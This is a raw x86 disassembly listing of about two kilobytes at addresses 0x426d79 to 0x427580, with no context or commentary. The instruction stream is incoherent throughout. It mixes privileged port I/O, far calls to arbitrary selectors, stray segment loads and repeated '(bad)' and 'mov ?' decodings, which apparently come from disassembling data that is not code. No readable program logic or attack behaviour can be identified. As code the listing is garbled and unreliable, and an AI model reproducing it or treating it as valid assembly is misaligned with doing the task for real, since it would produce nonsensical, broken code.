  426d79:	jmp    0x9498d3c6
  426d7e:	push   0x67
  426d80:	push   ebp
  426d81:	cmc    
  426d82:	js     0x426dd8
  426d84:	ja     0x426d34
  426d86:	jecxz  0x426d47
  426d88:	pop    ss
  426d89:	mov    cl,0x91
  426d8b:	push   0x3416c6f5
  426d90:	sbb    dh,BYTE PTR [edx+eax*8+0x38]
  426d94:	push   ds
  426d95:	icebp  
  426d96:	add    ch,BYTE PTR [edx+0x47]
  426d99:	pusha  
  426d9a:	cmc    
  426d9b:	enter  0x9327,0x52
  426d9f:	mov    ebp,0x2448ab97
  426da4:	cmp    BYTE PTR [ebx],ch
  426da6:	push   ebp
  426da7:	inc    esp
  426da8:	xchg   esi,eax
  426da9:	outs   dx,DWORD PTR ds:[esi]
  426daa:	fisttp QWORD PTR [edi+edx*8-0x64]
  426dae:	out    dx,eax
  426daf:	outs   dx,BYTE PTR ds:[esi]
  426db0:	jb     0x426d60
  426db2:	mov    dl,0xe6
  426db4:	push   ds
  426db5:	out    dx,eax
  426db6:	sbb    eax,0x1b9b6ab4
  426dbb:	pop    ebp
  426dbc:	loopne 0x426e22
  426dbe:	repz daa 
  426dc0:	fucomi st,st(4)
  426dc2:	xchg   esp,eax
  426dc3:	dec    edx
  426dc4:	jl     0x426d8c
  426dc6:	ret    0xd928
  426dc9:	out    0x55,eax
  426dcb:	call   0x1002:0xac005a9d
  426dd2:	or     BYTE PTR [ebp+0x24158a53],dl
  426dd8:	mov    es,edi
  426dda:	jns    0x426d6f
  426ddc:	mov    ebx,0x4eb1024c
  426de1:	jecxz  0x426e2b
  426de3:	mov    ch,0x8c
  426de5:	imul   edx,ebp,0xc90a3283
  426deb:	jp     0x426d7b
  426ded:	loope  0x426e0c
  426def:	lea    edx,[esi]
  426df1:	test   dh,bh
  426df3:	call   0x7f3b:0xf69f944d
  426dfa:	rcl    DWORD PTR [ecx],cl
  426dfc:	cmp    al,0xc8
  426dfe:	jo     0x426da2
  426e00:	jmp    0xa343:0xf3ad66ba
  426e07:	aad    0x2d
  426e09:	xor    esi,edx
  426e0b:	test   DWORD PTR [eax-0x2249de5b],edx
  426e11:	into   
  426e12:	cmp    esp,eax
  426e14:	inc    edi
  426e15:	lock jns 0x426dc6
  426e18:	cli    
  426e19:	mov    dh,0x96
  426e1b:	scas   eax,DWORD PTR es:[edi]
  426e1c:	shr    DWORD PTR [eax+0x1f],0x77
  426e20:	jl     0x426e14
  426e22:	div    DWORD PTR ds:0x3051d1e7
  426e28:	stos   DWORD PTR es:[edi],eax
  426e29:	adc    al,cl
  426e2b:	xchg   edi,eax
  426e2c:	je     0x426e5e
  426e2e:	cmp    ebx,DWORD PTR [ebp+0x21ff3939]
  426e34:	add    BYTE PTR [ebx+0x4e971ac2],0x72
  426e3b:	jb     0x426df3
  426e3d:	cmc    
  426e3e:	mov    cl,al
  426e40:	pop    ds
  426e41:	mov    ah,0x38
  426e43:	mov    al,0xc5
  426e45:	in     al,dx
  426e46:	xchg   esp,eax
  426e47:	test   BYTE PTR [ebx+0x30],ah
  426e4a:	addr16 cmp ebx,0x15906c34
  426e51:	stos   BYTE PTR es:[edi],al
  426e52:	jmp    0x5104b3f8
  426e57:	pop    es
  426e58:	(bad)  
  426e59:	cmp    dl,BYTE PTR [esi-0x2902492]
  426e5f:	xchg   esi,eax
  426e60:	je     0x426ec2
  426e62:	cld    
  426e63:	ret    0x709
  426e66:	add    bl,BYTE PTR [edx+0x11]
  426e69:	es test al,0x9d
  426e6c:	cmp    edi,edi
  426e6e:	jbe    0x426e2c
  426e70:	mov    ebp,0x9aec17f3
  426e75:	into   
  426e76:	jae    0x426e33
  426e78:	ins    BYTE PTR es:[edi],dx
  426e79:	cmp    BYTE PTR [ebp+0x7dfbc1f8],bl
  426e7f:	jne    0x426ee8
  426e81:	push   esi
  426e82:	out    dx,al
  426e83:	nop
  426e84:	push   ebx
  426e85:	leave  
  426e86:	(bad)  
  426e88:	ins    BYTE PTR es:[edi],dx
  426e89:	push   ds
  426e8a:	sbb    al,0x86
  426e8c:	in     al,0x1
  426e8e:	jp     0x426ef6
  426e90:	stc    
  426e91:	pop    esp
  426e92:	fidivr WORD PTR [esi]
  426e94:	enter  0x2681,0x9e
  426e98:	push   ss
  426e99:	or     BYTE PTR [ebp+ebp*1-0x34],ch
  426e9d:	out    0x41,eax
  426e9f:	inc    eax
  426ea0:	loop   0x426e3e
  426ea2:	ins    BYTE PTR es:[edi],dx
  426ea3:	mov    edi,0xffb619ec
  426ea8:	pushf  
  426ea9:	push   esp
  426eaa:	and    al,0x8a
  426eac:	push   0x4736c53e
  426eb1:	xchg   ebp,ebx
  426eb3:	push   0xff3fe124
  426eb8:	xchg   esp,eax
  426eb9:	mov    edi,DWORD PTR [eax+edi*1+0x5d]
  426ebd:	popa   
  426ebe:	jbe    0x426ee6
  426ec0:	aaa    
  426ec1:	cmp    eax,0x600353b1
  426ec6:	jae    0x426e54
  426ec8:	xchg   esp,eax
  426ec9:	inc    edx
  426eca:	mov    ecx,0x2ed48d3
  426ecf:	das    
  426ed0:	test   bl,ah
  426ed2:	and    esi,ebp
  426ed4:	and    eax,0xd44669e5
  426ed9:	or     eax,0x17eb6e22
  426ede:	jae    0x426f41
  426ee0:	or     al,0xe3
  426ee2:	xchg   edi,eax
  426ee3:	leave  
  426ee4:	xchg   esi,eax
  426ee5:	fisubr WORD PTR [esi+0x4c855131]
  426eeb:	rcl    DWORD PTR [eax+0x7c],cl
  426eee:	jno    0x426e92
  426ef0:	or     edi,DWORD PTR [ebp+0x4c]
  426ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef4:	xor    al,0x55
  426ef6:	xchg   ebx,eax
  426ef7:	dec    ebp
  426ef8:	retf   0xf14e
  426efb:	dec    esi
  426efc:	(bad)  
  426efd:	cwde   
  426efe:	rcl    al,0xec
  426f01:	aas    
  426f02:	sbb    eax,0x31582078
  426f07:	jbe    0x426f2c
  426f09:	or     BYTE PTR [edx+0x5af65ad1],al
  426f0f:	iret   
  426f10:	sbb    bl,BYTE PTR [edx-0x47047a1c]
  426f16:	leave  
  426f17:	inc    ecx
  426f18:	mov    bl,bl
  426f1a:	test   eax,0xcc12772d
  426f1f:	mov    al,0x1d
  426f21:	inc    ebp
  426f22:	adc    DWORD PTR [ecx+0x7ef4bb9d],0xffffffb2
  426f29:	mov    bh,0x89
  426f2b:	sub    al,0xa4
  426f2d:	lds    edi,FWORD PTR [edi+0x5270737b]
  426f33:	adc    edx,esp
  426f35:	add    BYTE PTR [edx],ah
  426f37:	cli    
  426f38:	aad    0xa5
  426f3a:	retf   
  426f3b:	arpl   WORD PTR [ebx+ebp*1+0x653e6ef9],dx
  426f42:	add    ebx,DWORD PTR [edx+eiz*1+0x5f339f7a]
  426f49:	mov    edi,0xddd37ef8
  426f4e:	inc    esi
  426f4f:	jb     0x426f4c
  426f51:	sbb    BYTE PTR [edx],0x42
  426f54:	into   
  426f55:	add    eax,DWORD PTR [eax-0x23]
  426f58:	inc    ecx
  426f59:	cmp    BYTE PTR [edx+eax*4],ch
  426f5c:	push   0xbed58113
  426f61:	inc    ebp
  426f62:	adc    ecx,DWORD PTR [edi+0x79623aff]
  426f68:	jle    0x426f7d
  426f6a:	adc    ch,BYTE PTR [eax+0x1e]
  426f6d:	jle    0x426f68
  426f6f:	call   0xb71408c1
  426f74:	jo     0x426faf
  426f76:	test   cl,dh
  426f78:	add    BYTE PTR [ecx+0x44f81530],cl
  426f7e:	inc    edi
  426f7f:	xor    DWORD PTR [ebp+edx*1-0x6fa0cdb0],esi
  426f86:	xchg   esp,eax
  426f87:	jle    0x426f23
  426f89:	lock dec ecx
  426f8b:	jb     0x426f1b
  426f8d:	or     ebp,DWORD PTR [ebx+0x61759749]
  426f93:	add    DWORD PTR [esi+0x7f],ebx
  426f96:	(bad)
  426f9b:	dec    edx
  426f9c:	test   eax,0x298b71ff
  426fa1:	imul   eax,DWORD PTR [edx-0x32],0x8e223bd7
  426fa8:	adc    DWORD PTR [ebp+0x1f],ecx
  426fab:	gs xchg esi,eax
  426fad:	mov    eax,0xcc171ed4
  426fb2:	int3   
  426fb3:	mov    ?,WORD PTR [edx]
  426fb5:	(bad)  
  426fb6:	cmc    
  426fb7:	es jno 0x426f61
  426fba:	add    BYTE PTR ds:0x9874e778,ch
  426fc0:	ins    BYTE PTR es:[edi],dx
  426fc1:	pop    ebx
  426fc2:	das    
  426fc3:	ds cli 
  426fc5:	inc    eax
  426fc6:	xor    dh,BYTE PTR [eax+eax*1]
  426fc9:	sub    dl,BYTE PTR [ebp+eiz*1-0x786d5def]
  426fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fd1:	cli    
  426fd2:	cwde   
  426fd3:	scas   al,BYTE PTR es:[edi]
  426fd4:	inc    edi
  426fd5:	and    eax,0x3d879164
  426fda:	pop    esi
  426fdb:	call   0x8e18:0x72e2dfb9
  426fe2:	cli    
  426fe3:	jb     0x42704e
  426fe5:	jb     0x426f91
  426fe7:	(bad)
  426feb:	xor    dh,BYTE PTR [eax]
  426fed:	and    ecx,DWORD PTR [edi+0x52]
  426ff0:	sbb    ah,BYTE PTR [ebx-0x3bef52c3]
  426ff6:	test   al,0xb8
  426ff8:	or     al,0x16
  426ffa:	nop
  426ffb:	dec    edx
  426ffc:	add    ecx,DWORD PTR [ebx-0x3ec69c17]
  427002:	pop    eax
  427003:	cwde   
  427004:	add    eax,0xb8d6c5b8
  427009:	xchg   esp,eax
  42700a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42700b:	dec    esp
  42700c:	jne    0x42703f
  42700e:	mov    ecx,0x42a21f56
  427013:	fdiv   QWORD PTR ds:0x0
	...
  427021:	sbb    eax,DWORD PTR [ebp+0x65]
  427024:	ret    
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	rcl    dl,cl
  42702e:	out    0x3a,eax
  427030:	mov    ah,0x59
  427032:	out    0x1,al
  427034:	add    BYTE PTR [ebx+eax*1-0x2510000],ch
  42703b:	ret    
  42703c:	push   ebx
  42703d:	test   al,0xe9
  42703f:	pop    ebp
  427040:	fisttp WORD PTR [ecx]
  427042:	xchg   ecx,eax
  427043:	stos   BYTE PTR es:[edi],al
  427044:	(bad)  
  427045:	xchg   ebp,eax
  427046:	mov    cl,0x82
  427048:	js     0x42705a
  42704a:	imul   edx,DWORD PTR [eax+0x2fac1c2d],0xffffffb8
  427051:	inc    edx
  427052:	sbb    ecx,ecx
  427054:	(bad)  
  427056:	pop    edi
  427057:	repz out dx,eax
  427059:	jge    0x42707d
  42705b:	inc    ebp
  42705c:	out    0xd6,eax
  42705e:	and    al,0x27
  427060:	pop    ecx
  427061:	test   BYTE PTR [edx-0x6e],ch
  427064:	jno    0x427052
  427066:	outs   dx,BYTE PTR ds:[esi]
  427067:	mov    DWORD PTR [ecx+0x4a],0x24e40a13
  42706e:	dec    eax
  42706f:	rol    bl,cl
  427071:	and    eax,0xcca2c5f0
  427076:	mov    cl,0xab
  427078:	loop   0x427029
  42707a:	sbb    BYTE PTR [ebp-0x73],bl
  42707d:	fsubr  QWORD PTR [edx]
  42707f:	push   cs
  427080:	push   cs
  427081:	mov    eax,ds:0x573ede5c
  427086:	pop    ebp
  427087:	scas   al,BYTE PTR es:[edi]
  427088:	aam    0x6f
  42708a:	xchg   edi,eax
  42708b:	push   0xc1f8034d
  427090:	mov    al,ds:0x31ce5b90
  427095:	sub    dl,BYTE PTR [esi-0x3390d9a7]
  42709b:	push   ecx
  42709c:	ins    DWORD PTR es:[edi],dx
  42709d:	and    eax,0x256aa0f1
  4270a2:	inc    edi
  4270a3:	adc    dh,ah
  4270a5:	lock push ecx
  4270a7:	or     bl,0x99
  4270aa:	mov    edx,DWORD PTR [eax-0x7c]
  4270ad:	test   BYTE PTR [esp+ecx*8+0x39],ah
  4270b1:	fdiv   QWORD PTR [ebx]
  4270b3:	mov    ?,WORD PTR [edi+0x55]
  4270b6:	pop    DWORD PTR [esi+0x42]
  4270b9:	sti    
  4270ba:	or     DWORD PTR [ebx+0x458a09d7],0x2d
  4270c1:	int3   
  4270c2:	(bad)  [esp+edx*1+0x71063960]
  4270c9:	outs   dx,BYTE PTR ds:[esi]
  4270ca:	and    eax,0x1d4212c0
  4270cf:	cmp    eax,0xe48fd3d0
  4270d4:	or     edi,DWORD PTR [ebp-0x7b]
  4270d7:	pop    esi
  4270d8:	test   BYTE PTR [ebx+0xdb78232],bl
  4270de:	lock das 
  4270e0:	pop    ebp
  4270e1:	cld    
  4270e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270e3:	mov    dl,0x99
  4270e5:	sar    DWORD PTR [edi-0x67],1
  4270e8:	stos   BYTE PTR es:[edi],al
  4270e9:	xor    DWORD PTR [ecx-0x63],ecx
  4270ec:	fcmovnu st,st(1)
  4270ee:	loope  0x427075
  4270f0:	push   es
  4270f1:	cmp    bh,BYTE PTR [esi+0x28]
  4270f4:	mov    al,ds:0x5806dd74
  4270f9:	cmp    edi,ecx
  4270fb:	xor    bh,ah
  4270fd:	mov    ebx,0x4cdbe028
  427102:	cli    
  427103:	cdq    
  427104:	js     0x427146
  427106:	gs sub bl,cl
  427109:	mov    al,ds:0xfdf87d33
  42710e:	sahf   
  42710f:	jae    0x42716b
  427111:	add    ecx,DWORD PTR [ecx]
  427113:	xchg   BYTE PTR [edi],ah
  427115:	xor    ecx,ebx
  427117:	sahf   
  427118:	add    edx,DWORD PTR [ebx-0x1f84ce38]
  42711e:	push   esi
  42711f:	hlt    
  427120:	xor    dh,dl
  427122:	mov    esp,DWORD PTR [ebp+0x2e]
  427125:	mov    bl,0x2d
  427127:	adc    bl,BYTE PTR [edx]
  427129:	sbb    edi,DWORD PTR [esi+0x5]
  42712c:	pushf  
  42712d:	lock aaa 
  42712f:	in     eax,dx
  427130:	pusha  
  427131:	push   cs
  427132:	sti    
  427133:	mov    DWORD PTR [ecx],ebp
  427135:	cmc    
  427136:	push   eax
  427137:	shl    BYTE PTR [esi],cl
  427139:	cmp    DWORD PTR [edi],ebp
  42713b:	pop    ebp
  42713c:	sub    al,0xa6
  42713e:	hlt    
  42713f:	ficom  DWORD PTR [ebx]
  427141:	je     0x427112
  427143:	inc    esi
  427144:	aaa    
  427145:	xchg   DWORD PTR [esi],esp
  427147:	gs dec edi
  427149:	xchg   DWORD PTR [edx+0x19],esp
  42714c:	xchg   ebx,eax
  42714d:	xor    al,0x71
  42714f:	sub    dl,BYTE PTR [ebp-0x13]
  427152:	repnz dec esp
  427154:	sbb    esp,edi
  427156:	fsubr  DWORD PTR [edx-0x450a2aba]
  42715c:	into   
  42715d:	sbb    ecx,ecx
  42715f:	mov    edi,0x67c63eb3
  427164:	ss fdiv st,st(6)
  427167:	sbb    edx,DWORD PTR [edx-0xf]
  42716a:	les    edx,FWORD PTR [esi+0x42]
  42716d:	dec    ecx
  42716e:	sbb    ah,BYTE PTR [ecx]
  427170:	retf   0x6252
  427173:	test   eax,0x95c7d79e
  427178:	jne    0x4271b8
  42717a:	pop    ss
  42717b:	dec    ebp
  42717c:	mov    eax,ds:0x3122e904
  427181:	pop    ds
  427182:	jbe    0x427180
  427184:	in     al,dx
  427185:	sub    eax,0x92bf19eb
  42718a:	sbb    edi,DWORD PTR [eax+eiz*2+0x38ea4b23]
  427191:	sub    DWORD PTR [edi],ebx
  427193:	js     0x4271da
  427195:	xchg   ecx,eax
  427196:	lea    edi,[ecx]
  427198:	and    dh,BYTE PTR [eax]
  42719a:	scas   eax,DWORD PTR es:[edi]
  42719b:	xor    edx,eax
  42719d:	sti    
  42719e:	adc    ebp,esi
  4271a0:	rol    BYTE PTR [ebx],cl
  4271a2:	pop    edx
  4271a3:	pop    edi
  4271a4:	jmp    0x4271ce
  4271a6:	add    edi,DWORD PTR [ecx-0x7c]
  4271a9:	adc    eax,esp
  4271ab:	mov    cl,0x4d
  4271ad:	xchg   ebx,eax
  4271ae:	push   esp
  4271af:	mov    ch,0x62
  4271b1:	aam    0xee
  4271b3:	or     dl,BYTE PTR [ebp-0x2c07893f]
  4271b9:	push   eax
  4271ba:	inc    ebx
  4271bb:	in     al,dx
  4271bc:	fstp   st(4)
  4271be:	add    edx,DWORD PTR [edi+ecx*2+0x3f]
  4271c2:	or     al,0x48
  4271c4:	and    eax,0x280b1b62
  4271c9:	out    dx,eax
  4271ca:	jmp    0x42721e
  4271cc:	adc    esi,DWORD PTR [ecx-0x2c]
  4271cf:	jo     0x4271fd
  4271d1:	(bad)  
  4271d3:	or     DWORD PTR [ebx+0x664049cf],esi
  4271d9:	xor    ch,BYTE PTR [eax+ebx*2]
  4271dc:	xchg   ebp,eax
  4271dd:	add    BYTE PTR [esi+0x3c231eb8],0x3f
  4271e4:	jns    0x427188
  4271e6:	fwait
  4271e7:	inc    ebx
  4271e8:	ins    DWORD PTR es:[edi],dx
  4271e9:	fs cdq 
  4271eb:	adc    eax,DWORD PTR [ecx-0x7e]
  4271ee:	pop    edi
  4271ef:	lock inc eax
  4271f1:	jne    0x42717e
  4271f3:	loope  0x427232
  4271f5:	dec    esi
  4271f6:	rol    BYTE PTR [edx-0x80],0xff
  4271fa:	daa    
  4271fb:	and    eax,0xc208ac52
  427200:	jo     0x427266
  427202:	inc    ebp
  427203:	shl    DWORD PTR [eax+ecx*4-0x12],0x7d
  427208:	les    eax,FWORD PTR [ebp-0x6e]
  42720b:	mov    edi,0x227ecdd0
  427210:	leave  
  427211:	sub    eax,0x50a9370b
  427216:	xchg   ebp,eax
  427217:	jno    0x42723b
  427219:	inc    edi
  42721a:	push   esi
  42721b:	fbstp  TBYTE PTR [eax]
  42721d:	sbb    DWORD PTR [esi],ebp
  42721f:	aam    0x30
  427221:	adc    ch,BYTE PTR [ebx+0x77b05521]
  427227:	jecxz  0x427252
  427229:	mov    ch,0x10
  42722b:	and    BYTE PTR [eax+0x18],cl
  42722e:	imul   DWORD PTR [edx+edx*1-0x4775da6d]
  427235:	mov    edx,0x4d6fe7a7
  42723a:	(bad)  
  42723b:	fisub  DWORD PTR [esi]
  42723d:	mov    bh,0x8
  42723f:	cmp    DWORD PTR [esi],0xd7473bd1
  427245:	int3   
  427246:	aaa    
  427247:	xchg   ebp,eax
  427248:	lea    eax,[ebx+0x1d27021a]
  42724e:	ret    
  42724f:	adc    BYTE PTR [eax+0x17],0x5a
  427253:	adc    BYTE PTR [ecx],bl
  427255:	sbb    bh,BYTE PTR [edx-0x18abafe3]
  42725b:	loopne 0x427219
  42725d:	adc    BYTE PTR [edx-0x60],al
  427260:	and    esp,DWORD PTR [esi-0x4e]
  427263:	pop    ebx
  427264:	mov    ebx,DWORD PTR ds:0x81b3d346
  42726a:	push   ds
  42726b:	cwde   
  42726c:	xchg   edx,eax
  42726d:	sbb    eax,0x1b2b9e27
  427272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427273:	lock and eax,0xeb229caf
  427279:	jbe    0x427214
  42727b:	xchg   ecx,eax
  42727c:	call   0xefc27dd8
  427281:	and    al,0x30
  427283:	jle    0x4272a0
  427285:	or     DWORD PTR [edi],ecx
  427287:	xchg   edi,eax
  427288:	cld    
  427289:	out    0x6a,al
  42728b:	and    DWORD PTR [esi-0x7617d745],edi
  427291:	dec    esi
  427292:	ror    BYTE PTR ds:0x18a4b95e,0x50
  427299:	pop    esp
  42729a:	test   DWORD PTR [ebx],ebp
  42729c:	cmc    
  42729d:	push   ebp
  42729e:	cli    
  42729f:	sti    
  4272a0:	sub    al,0xea
  4272a2:	dec    ebx
  4272a3:	es xchg ebp,eax
  4272a5:	xchg   BYTE PTR [eax+0x6b],bl
  4272a8:	and    bh,ch
  4272aa:	dec    eax
  4272ab:	retf   0xffae
  4272ae:	jmp    0x9e71:0x2d4e3284
  4272b5:	pmuludq mm3,mm6
  4272b8:	fild   WORD PTR [eax-0x22]
  4272bb:	xor    bl,BYTE PTR ds:0xa1e1b1c
  4272c1:	int3   
  4272c2:	scas   al,BYTE PTR es:[edi]
  4272c3:	jnp    0x427330
  4272c5:	and    eax,0xb3e54699
  4272ca:	dec    esi
  4272cb:	out    dx,eax
  4272cc:	sub    al,0x8e
  4272ce:	test   al,0x70
  4272d1:	inc    si
  4272d3:	adc    ebp,DWORD PTR [ecx+0x7e0baffd]
  4272d9:	push   ds
  4272da:	sti    
  4272db:	loop   0x4272bf
  4272dd:	and    BYTE PTR [ebp-0x57],0xaa
  4272e1:	xchg   edx,eax
  4272e2:	lock dec edi
  4272e4:	dec    ebp
  4272e5:	das    
  4272e6:	dec    esp
  4272e7:	icebp  
  4272e8:	mov    edi,0x6f1fce5d
  4272ed:	daa    
  4272ee:	push   cs
  4272ef:	gs pop ss
  4272f1:	loopne 0x4272f0
  4272f3:	das    
  4272f4:	sub    dl,bh
  4272f6:	mov    ebx,0xf9347868
  4272fb:	inc    ebp
  4272fc:	ins    DWORD PTR es:[edi],dx
  4272fd:	ss dec esi
  4272ff:	leave  
  427300:	and    DWORD PTR [edi-0x63],ebx
  427303:	ret    
  427304:	pop    ds
  427305:	das    
  427306:	jb     0x42734e
  427308:	cmp    BYTE PTR [edx],al
  42730a:	pushf  
  42730b:	fldpi  
  42730d:	adc    eax,0x78f3f27e
  427312:	js     0x4272ee
  427314:	in     eax,0x7c
  427316:	fs jns 0x4272b3
  427319:	lahf   
  42731a:	imul   edi,DWORD PTR [esi],0xbbf5afac
  427320:	int    0x51
  427322:	mov    bh,0x62
  427324:	mov    cl,0x17
  427326:	inc    esi
  427327:	popa   
  427328:	int    0xcb
  42732a:	aas    
  42732b:	dec    esi
  42732c:	repz jns 0x4273a7
  42732f:	loope  0x427381
  427331:	xchg   ecx,eax
  427332:	mov    edi,DWORD PTR [ebx-0x6a]
  427335:	(bad)  
  427336:	push   cs
  427337:	sub    BYTE PTR [ebx-0x496d915b],0xeb
  42733e:	mov    ecx,0xf9525a84
  427343:	jns    0x427381
  427345:	scas   al,BYTE PTR es:[edi]
  427346:	loope  0x427312
  427348:	adc    DWORD PTR ds:0x3562e40e,ecx
  42734e:	daa    
  42734f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427350:	fsub   st(3),st
  427352:	loope  0x4273c8
  427354:	imul   edx,DWORD PTR [edi],0x30
  427357:	add    bl,BYTE PTR [edi]
  427359:	add    cl,BYTE PTR [ebp-0x4c]
  42735c:	jge    0x42736b
  42735e:	dec    edx
  42735f:	out    0x30,eax
  427361:	adc    DWORD PTR [esi+0x4],0x42
  427365:	hlt    
  427366:	(bad)  
  427368:	sub    ch,dl
  42736a:	popa   
  42736b:	and    al,0x70
  42736d:	push   ds
  42736e:	out    dx,al
  42736f:	and    DWORD PTR [ebx+0x41c20458],ebx
  427375:	xor    DWORD PTR [ebx-0x2303eff4],edx
  42737b:	je     0x4273aa
  42737d:	sar    eax,cl
  42737f:	cmp    eax,0x3413369d
  427384:	dec    esi
  427385:	lahf   
  427386:	inc    esp
  427387:	ror    BYTE PTR [ebx],0x6a
  42738a:	pop    edi
  42738b:	pushf  
  42738c:	(bad)  [edi]
  42738e:	sahf   
  42738f:	scas   al,BYTE PTR es:[edi]
  427390:	xor    WORD PTR [edi-0xb582b4],si
  427397:	jmp    0x5263:0x1556fce6
  42739e:	fist   DWORD PTR [edi+0x63]
  4273a1:	call   0x79740b84
  4273a6:	arpl   bp,di
  4273a8:	les    edi,FWORD PTR [edi]
  4273aa:	(bad)  
  4273ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ac:	or     eax,0xcc78391a
  4273b1:	imul   ebp,DWORD PTR [edx],0xffffffce
  4273b4:	rol    BYTE PTR [ecx],cl
  4273b6:	out    0x9b,eax
  4273b8:	xchg   ecx,eax
  4273b9:	out    dx,al
  4273ba:	cmp    ebx,DWORD PTR [edi+0x25]
  4273bd:	sub    edx,esi
  4273bf:	sub    cl,bl
  4273c1:	push   0xffffffce
  4273c3:	imul   ecx,ebx,0xffffff8b
  4273c6:	add    al,0x70
  4273c8:	xchg   ebp,eax
  4273c9:	push   0x1c983b8b
  4273ce:	in     al,dx
  4273cf:	ret    0xfc83
  4273d2:	xchg   ecx,eax
  4273d3:	add    BYTE PTR [edx+0x6fc065d2],dh
  4273d9:	call   0xe4cf:0x57517e83
  4273e0:	imul   esi,DWORD PTR [esi+0x514b72],0x0
  4273ea:	add    BYTE PTR [eax],al
  4273ec:	add    BYTE PTR [eax],al
  4273ee:	add    BYTE PTR [eax],al
  4273f0:	add    BYTE PTR [edi+eax*2],cl
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0xd19f609
  4273fe:	jb     0x427393
  427400:	fiadd  DWORD PTR ds:0xac0001ea
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    BYTE PTR [esi+esi*1+0x6cc8c5e2],cl
  42740f:	push   edi
  427410:	mov    ebp,0xf55ad902
  427415:	adc    eax,0x917e05b4
  42741a:	mov    ah,0xdb
  42741c:	aaa    
  42741d:	(bad)  
  42741e:	(bad)  
  42741f:	hlt    
  427420:	or     dl,ch
  427422:	dec    ebx
  427423:	out    0x49,eax
  427425:	mov    edi,DWORD PTR [ebp-0x7ef458f1]
  42742b:	inc    esi
  42742c:	jmp    FWORD PTR [edi-0x45]
  42742f:	and    BYTE PTR [edi+eax*8+0x6a1e6a7a],cl
  427436:	nop
  427437:	outs   dx,BYTE PTR ds:[esi]
  427438:	repnz popa 
  42743a:	or     ebx,DWORD PTR [edx+ebp*1]
  42743d:	cmpps  xmm4,xmm2,0x4e
  427441:	lods   eax,DWORD PTR ds:[esi]
  427442:	dec    esp
  427443:	(bad)  
  427444:	mov    esi,0xd245d2cf
  427449:	and    ebx,edx
  42744b:	add    eax,0x75099660
  427450:	sub    DWORD PTR [edi+0x4d],0x598f5d54
  427457:	popf   
  427458:	jge    0x4273ea
  42745a:	dec    eax
  42745b:	aad    0x68
  42745d:	addr16 adc al,0x2a
  427460:	cwde   
  427461:	shl    bl,cl
  427463:	loope  0x42742c
  427465:	or     eax,0xd9ef5d37
  42746a:	adc    eax,DWORD PTR [ebp-0xa]
  42746d:	sub    BYTE PTR [edx+0x3b],0xaf
  427471:	repz pop esp
  427473:	arpl   ax,si
  427475:	call   0x99e4b161
  42747a:	enter  0x65be,0x1a
  42747e:	mov    ebx,esi
  427480:	in     al,0x12
  427482:	and    al,0x9f
  427484:	jl     0x42748b
  427486:	(bad)  
  427487:	(bad)  
  427488:	in     eax,dx
  427489:	aaa    
  42748a:	and    al,0x72
  42748c:	push   esp
  42748d:	xchg   BYTE PTR [ecx+0x4c919734],dh
  427493:	adc    eax,0xb149b46d
  427498:	out    dx,al
  427499:	and    BYTE PTR [edx-0x53a7b123],ah
  42749f:	in     al,0x4d
  4274a1:	std    
  4274a2:	mov    ecx,0x2d0550fd
  4274a7:	int3   
  4274a8:	add    DWORD PTR [ebp+0x10ddc9ca],edi
  4274ae:	cli    
  4274af:	or     bl,BYTE PTR [eax+0x1d]
  4274b2:	pop    ecx
  4274b3:	mov    esp,0xc9c0c353
  4274b8:	cmp    eax,0x6e1f6df7
  4274bd:	nop
  4274be:	hlt    
  4274bf:	call   0x5906:0x999fe4f7
  4274c6:	mov    ebx,0xb03132fc
  4274cb:	or     DWORD PTR [ecx-0x27],0xfffffff2
  4274cf:	add    eax,0x3091f14d
  4274d4:	out    0x85,al
  4274d6:	std    
  4274d7:	push   cs
  4274d8:	popa   
  4274d9:	call   0x9d7ec37d
  4274de:	pop    esi
  4274df:	dec    ecx
  4274e0:	je     0x427462
  4274e2:	je     0x427527
  4274e4:	mov    esi,0xbc9aff81
  4274e9:	push   0xe7fcfea0
  4274ee:	enter  0xaac4,0x88
  4274f2:	stc    
  4274f3:	xor    eax,0x7c00b16c
  4274f8:	or     edi,DWORD PTR [eax-0x68]
  4274fb:	dec    edi
  4274fc:	cdq    
  4274fd:	push   eax
  4274fe:	xchg   ecx,eax
  4274ff:	jg     0x42754d
  427501:	cmc    
  427502:	call   0xc8d167f0
  427507:	(bad)  
  427508:	int3   
  427509:	das    
  42750a:	adc    eax,0x759f81a
  42750f:	jmp    0x42749f
  427511:	stc    
  427512:	push   edi
  427513:	pop    ebp
  427514:	push   0xffffffa8
  427516:	pop    ebp
  427517:	jl     0x427587
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	int3   
  42751b:	iret   
  42751c:	sbb    al,0x3f
  42751e:	sub    DWORD PTR [ecx+ecx*2-0x41],0x9ab1097f
  427526:	adc    DWORD PTR [ebx+0x1d390d4d],edi
  42752c:	in     al,dx
  42752d:	sbb    ah,ch
  42752f:	or     edi,DWORD PTR ds:0xa4a14cc9
  427535:	in     eax,dx
  427536:	sub    dh,cl
  427538:	pop    ds
  427539:	sub    ebp,DWORD PTR [ebx+0x6f142e80]
  42753f:	push   ebp
  427540:	pop    esp
  427541:	push   ebp
  427542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427543:	sbb    eax,0xdba73606
  427548:	mov    ebx,0x75f265de
  42754d:	arpl   ax,ax
  42754f:	les    edi,FWORD PTR [edx+ecx*8-0x7ef5e8f5]
  427556:	xor    eax,0x8800c0da
  42755b:	mov    DWORD PTR [edx+0x2a50176b],0xf73574e6
  427565:	and    DWORD PTR [ecx],esi
  427567:	pop    ebp
  427568:	ret    
  427569:	pusha  
  42756a:	add    BYTE PTR [ebp+0x33171e4c],0x4e
  427571:	adc    BYTE PTR [ecx+0x65],cl
  427574:	fisttp WORD PTR [esi+eax*4+0x3e687e79]
  42757b:	sub    eax,0xba9a5964
  427580:	stos   BYTE PTR es:[edi],al
